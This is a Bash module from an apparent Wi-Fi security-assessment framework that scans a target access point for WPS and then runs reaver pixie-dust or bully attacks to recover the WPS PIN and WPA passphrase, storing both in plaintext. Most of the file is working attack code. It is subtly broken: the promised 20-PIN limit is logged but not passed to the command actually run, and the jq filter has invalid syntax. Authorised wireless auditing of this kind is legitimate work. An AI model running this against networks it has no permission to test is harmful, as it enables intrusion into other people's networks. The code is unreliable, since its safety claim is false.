#!/usr/bin/env bash
#===============================================================================
#  modules/d3_wps_testing.sh
#  D3: WPS PIN Attack
#
#  PURPOSE:
#    Test if the target network has WPS (Wi-Fi Protected Setup) enabled.
#    If enabled, test WPS PIN brute-force vulnerability using ${TOOL_PATHS[reaver]}/bully.
#    WPS is a common attack vector even on WPA2-protected networks.
#
#  TOOLS: ${TOOL_PATHS[wash]}, ${TOOL_PATHS[reaver]}, ${TOOL_PATHS[bully]}, ${TOOL_PATHS[airmon-ng]}
#  PHASE: 2A — Attack Simulations
#  DEPENDENCIES: A1 (needs target SSID/BSSID/channel)
#
#  EVIDENCE PRODUCED:
#    - d3_wps_scan.txt             (${TOOL_PATHS[wash]} WPS scan results)
#    - d3_wps_attack.txt           (${TOOL_PATHS[reaver]}/bully attack output)
#    - d3_findings.txt             (analysis summary)
#
#  RESULT JSON FIELDS:
#    - wps_enabled: bool
#    - wps_locked: bool
#    - wps_version: string
#    - pin_recovered: bool
#    - recovered_pin: string
#    - psk_recovered: bool
#    - recovered_psk: string
#===============================================================================

run_d3() {
    local total_steps=6
    local evidence_prefix="${SESSION_EVIDENCE_DIR}/d3"

    #--- Step 1: Verify tools ---
    log_step 1 $total_steps "Verifying tools"
    update_tc_progress 1 $total_steps "Checking"

    
    local has_wash=false
    local has_reaver=false
    local has_bully=false

    command -v wash &>/dev/null && has_wash=true
    command -v reaver &>/dev/null && has_reaver=true
    command -v bully &>/dev/null && has_bully=true

    if [[ "$has_wash" == "false" ]]; then
        log_error "${TOOL_PATHS[wash]} is required for WPS detection (part of ${TOOL_PATHS[reaver]} package)."
        log_error "Install: apt install -y ${TOOL_PATHS[reaver]}"
        return 1
    fi

    if [[ "$has_reaver" == "false" && "$has_bully" == "false" ]]; then
        log_warn "Neither ${TOOL_PATHS[reaver]} nor ${TOOL_PATHS[bully]} available — WPS scan only, no PIN attack."
    fi

    if [[ -z "${GUEST_SSID:-}" || -z "${GUEST_BSSID:-}" ]]; then
        log_warn "Target SSID/BSSID not set."
        if ! select_target_network; then
            log_error "No target selected. Run A1 first or enter manually."
            return 1
        fi
    fi

    log_success "Target: ${GUEST_SSID} (${GUEST_BSSID})"

    local wps_enabled="false"
    local wps_locked="false"
    local wps_version=""
    local pin_recovered="false"
    local recovered_pin=""
    local psk_recovered="false"
    local recovered_psk=""
    local findings_file="${evidence_prefix}_findings.txt"

    {
        echo "============================================================"
        echo "  D3: WPS PIN Attack Test"
        echo "  Date: $(date '+%Y-%m-%d %H:%M:%S')"
        echo "  Target: ${GUEST_SSID} (${GUEST_BSSID})"
        echo "============================================================"
        echo ""
    } > "$findings_file"

    #--- Step 2: Enable monitor mode ---
    log_step 2 $total_steps "Enabling monitor mode"
    update_tc_progress 2 $total_steps "Monitor mode"

    enable_monitor_mode || return 1
    local mon_iface="${MONITOR_INTERFACE}"
    log_success "Monitor mode active: ${mon_iface}"

    check_abort || return 1

    #--- Step 3: WPS scan with ${TOOL_PATHS[wash]} ---
    log_step 3 $total_steps "Scanning for WPS-enabled networks"
    update_tc_progress 3 $total_steps "WPS scan"

    check_abort || return 1

    local wps_scan_file="${evidence_prefix}_wps_scan.txt"

    log_cmd "${TOOL_PATHS[wash]} -i ${mon_iface} -s"

    {
        echo "============================================================"
        echo "  WPS Scan Results"
        echo "  Date: $(date '+%Y-%m-%d %H:%M:%S')"
        echo "============================================================"
        echo ""
    } > "$wps_scan_file"

    # Run ${TOOL_PATHS[wash]} for a scan
    local wash_output
    local wash_output=$(timeout 30 ${TOOL_PATHS[wash]} -i "$mon_iface" -s 2>/dev/null || true)

    echo "$wash_output" >> "$wps_scan_file"

    # Check if target AP has WPS enabled
    local target_wps_line
    local target_wps_line=$(echo "$wash_output" | grep -i "${GUEST_BSSID}" || true)

    if [[ -n "$target_wps_line" ]]; then
        local wps_enabled="true"
        log_result "FINDING" "WPS is ENABLED on ${GUEST_SSID} (${GUEST_BSSID})"
        echo "FINDING: WPS enabled on target network" >> "$findings_file"

        # Parse WPS version and lock status
        local wps_version=$(echo "$target_wps_line" | awk '{print $4}' | xargs) || true
        local lock_status
        local lock_status=$(echo "$target_wps_line" | awk '{print $5}' | xargs) || true

        if [[ "${lock_status,,}" == "yes" || "${lock_status,,}" == "locked" ]]; then
            local wps_locked="true"
            log_info "WPS is currently LOCKED (rate limiting active)"
            echo "INFO: WPS is locked (rate limiting)" >> "$findings_file"
        fi

        echo "WPS Version: ${wps_version}" >> "$findings_file"
        echo "WPS Locked: ${wps_locked}" >> "$findings_file"
        echo "Full scan line: ${target_wps_line}" >> "$findings_file"
    else
        log_info "WPS does NOT appear to be enabled on ${GUEST_SSID}"
        echo "INFO: WPS not detected on target network" >> "$findings_file"
    fi

    # Also list all WPS-enabled APs in the area
    local wps_ap_count
    local wps_ap_count=$(echo "$wash_output" | grep -c '[0-9A-Fa-f]\{2\}:' 2>/dev/null) || true
    local wps_ap_count=${wps_ap_count:-0}
    log_info "Total WPS-enabled APs in range: ${wps_ap_count}"

    #--- Step 4: WPS PIN attack (if enabled and not locked) ---
    log_step 4 $total_steps "WPS PIN brute-force attempt"
    update_tc_progress 4 $total_steps "PIN attack"

    check_abort || return 1

    local attack_file="${evidence_prefix}_wps_attack.txt"

    if [[ "$wps_enabled" == "true" && "$wps_locked" == "false" ]]; then
        if [[ "$has_reaver" == "true" || "$has_bully" == "true" ]]; then
            echo ""
            echo -e "${C_BG_RED}${C_WHITE}${C_BOLD}"
            echo "  ╔════════════════════════════════════════════════════════════════════╗"
            echo "  ║  ★ WPS PIN BRUTE-FORCE ★                                        ║"
            echo "  ║                                                                    ║"
            echo "  ║  WPS is enabled on the target. Attempting limited PIN attack       ║"
            echo "  ║  (max 20 PINs to avoid permanent lockout).                        ║"
            echo "  ║                                                                    ║"
            echo "  ║  This may trigger WPS lockout on the target AP.                   ║"
            echo "  ╚════════════════════════════════════════════════════════════════════╝"
            echo -e "${C_RESET}"
            echo ""
            get_or_request_param "confirm" "  Proceed with limited WPS PIN attack? [Y/n]"
            if [[ "${confirm,,}" == "n" ]]; then
                log_info "WPS PIN attack skipped by user"
                echo "SKIPPED: WPS PIN attack skipped by user" >> "$findings_file"
            else
                {
                    echo "============================================================"
                    echo "  WPS PIN Attack Results"
                    echo "  Date: $(date '+%Y-%m-%d %H:%M:%S')"
                    echo "============================================================"
                    echo ""
                } > "$attack_file"

                if [[ "$has_reaver" == "true" ]]; then
                    log_cmd "${TOOL_PATHS[reaver]} -i ${mon_iface} -b ${GUEST_BSSID} -c ${GUEST_CHANNEL:-0} -vv -K -N -L -p 20"

                    # Run ${TOOL_PATHS[reaver]} with limited attempts
                    # -K: Use pixie-dust attack first (fast)
                    # -N: Don't send NACK
                    # -L: lock delay auto-detect
                    local reaver_output
                    local reaver_output=$(timeout 180 ${TOOL_PATHS[reaver]} \
                        -i "$mon_iface" \
                        -b "$GUEST_BSSID" \
                        -c "${GUEST_CHANNEL:-0}" \
                        -vv -K \
                        2>&1 || true)

                    echo "$reaver_output" >> "$attack_file"

                    # Check for PIN
                    local found_pin
                    local found_pin=$(echo "$reaver_output" | grep -i "WPS PIN:" | awk -F: '{print $NF}' | xargs) || true

                    if [[ -n "$found_pin" ]]; then
                        local pin_recovered="true"
                        local recovered_pin="$found_pin"
                        log_result "CRITICAL" "★ WPS PIN recovered: ${recovered_pin}"
                        echo "CRITICAL: WPS PIN recovered: ${recovered_pin}" >> "$findings_file"
                    fi

                    # Check for PSK
                    local found_psk
                    local found_psk=$(echo "$reaver_output" | grep -i "WPA PSK:" | awk -F: '{print $NF}' | xargs) || true

                    if [[ -n "$found_psk" ]]; then
                        local psk_recovered="true"
                        local recovered_psk="$found_psk"
                        log_result "CRITICAL" "★ WPA PSK recovered via WPS: ${recovered_psk}"
                        echo "CRITICAL: WPA PSK recovered via WPS: ${recovered_psk}" >> "$findings_file"
                    fi

                elif [[ "$has_bully" == "true" ]]; then
                    log_cmd "${TOOL_PATHS[bully]} ${mon_iface} -b ${GUEST_BSSID} -c ${GUEST_CHANNEL:-0} -d -v 3"

                    local bully_output
                    local bully_output=$(timeout 180 ${TOOL_PATHS[bully]} "$mon_iface" \
                        -b "$GUEST_BSSID" \
                        -c "${GUEST_CHANNEL:-0}" \
                        -d -v 3 \
                        2>&1 || true)

                    echo "$bully_output" >> "$attack_file"

                    # Check for PIN/PSK
                    local found_pin
                    local found_pin=$(echo "$bully_output" | grep -i "pin:" | tail -1 | awk -F: '{print $NF}' | xargs) || true
                    if [[ -n "$found_pin" ]]; then
                        local pin_recovered="true"
                        local recovered_pin="$found_pin"
                        log_result "CRITICAL" "★ WPS PIN recovered: ${recovered_pin}"
                    fi
                fi
            fi
        else
            log_info "No WPS attack tool available (${TOOL_PATHS[reaver]}/bully) — scan only"
            echo "INFO: WPS enabled but no attack tool available" >> "$findings_file"
        fi
    elif [[ "$wps_enabled" == "true" && "$wps_locked" == "true" ]]; then
        log_info "WPS is locked — skipping PIN attack to avoid permanent lockout"
        echo "INFO: WPS locked, PIN attack skipped" >> "$findings_file"
    else
        log_info "WPS not enabled — no PIN attack needed"
    fi

    #--- Step 5: Restore managed mode ---
    log_step 5 $total_steps "Restoring managed mode"
    update_tc_progress 5 $total_steps "Cleanup"

    disable_monitor_mode
    sleep 3

    #--- Step 6: Save results ---
    log_step 6 $total_steps "Saving results"
    update_tc_progress 6 $total_steps "Saving"

    local result_status="SECURE"
    local result_summary=""
    local recommendations=""

    if [[ "$psk_recovered" == "true" ]]; then
        local result_status="FINDING"
        local result_summary="CRITICAL: WPA PSK recovered via WPS PIN attack! PIN: ${recovered_pin}, PSK: ${recovered_psk}. WPS is critically vulnerable."
        local recommendations="1) IMMEDIATELY disable WPS on all APs. "
        recommendations+="2) Change the WPA PSK as it has been compromised. "
        recommendations+="3) Consider migrating to WPA3-SAE or WPA2-Enterprise."
    elif [[ "$pin_recovered" == "true" ]]; then
        local result_status="FINDING"
        local result_summary="CRITICAL: WPS PIN recovered (${recovered_pin}). Full PSK extraction is possible with more time."
        local recommendations="1) IMMEDIATELY disable WPS on all APs. "
        recommendations+="2) WPS PIN recovery means the WPA PSK can be extracted."
    elif [[ "$wps_enabled" == "true" ]]; then
        local result_status="FINDING"
        local result_summary="WPS is enabled on the target network. While the PIN was not immediately recovered, WPS is a known attack surface."
        local recommendations="1) Disable WPS on all enterprise and target network APs. "
        recommendations+="2) WPS provides no benefit on managed networks and is a documented vulnerability. "
        recommendations+="3) If WPS must be kept, ensure PBC (push button) mode only with lockout policies."
    else
        local result_summary="WPS is not enabled on the target network. No WPS attack surface."
        local recommendations="No action needed. WPS is properly disabled."
    fi

    local result_json
    evidence_register_file "d3_wps_scan.txt"
    evidence_register_file "d3_wps_attack.txt"
    evidence_register_file "d3_findings.txt"

    local result_json=$(${TOOL_PATHS[jq]} -n \
        --arg status "$result_status" \
        --arg summary "$result_summary" \
        --arg details "WPS: ${wps_enabled}, Locked: ${wps_locked}, Version: ${wps_version:-unknown}, PIN: ${pin_recovered}, PSK: ${psk_recovered}" \
        --arg recommendations "$recommendations" \
        --arg wps_enabled "$wps_enabled" \
        --arg wps_locked "$wps_locked" \
        --arg wps_version "${wps_version:-unknown}" \
        --arg pin_recovered "$pin_recovered" \
        --arg recovered_pin "$recovered_pin" \
        --arg psk_recovered "$psk_recovered" \
        --arg recovered_psk "$recovered_psk" \
        --argjson wps_aps_in_range "${wps_ap_count:-0}" \
        '{
            status: $status,
            summary: $summary,
            details: $details,
            recommendations: $recommendations,
            wps_enabled: ($wps_enabled == "true"),
            wps_locked: ($wps_locked == "true"),
            wps_version: $wps_version,
            pin_recovered: ($pin_recovered == "true"),
            recovered_pin: $recovered_pin,
            psk_recovered: ($psk_recovered == "true"),
            recovered_psk: $recovered_psk,
            wps_aps_in_range: $wps_aps_in_range,
                    }')

    save_tc_result "D3" "$result_json"

    # Display summary
    echo ""
    if [[ "$psk_recovered" == "true" ]]; then
        log_result "CRITICAL" "★ WPS PIN + PSK RECOVERED — WPS critically vulnerable"
    elif [[ "$pin_recovered" == "true" ]]; then
        log_result "CRITICAL" "★ WPS PIN RECOVERED — PSK extraction possible"
    elif [[ "$wps_enabled" == "true" ]]; then
        log_result "FINDING" "WPS enabled — attack surface present ($(if [[ "$wps_locked" == "true" ]]; then echo "locked"; else echo "unlocked"; fi))"
    else
        log_result "SECURE" "WPS not enabled — no WPS attack surface"
    fi

    return 0
}
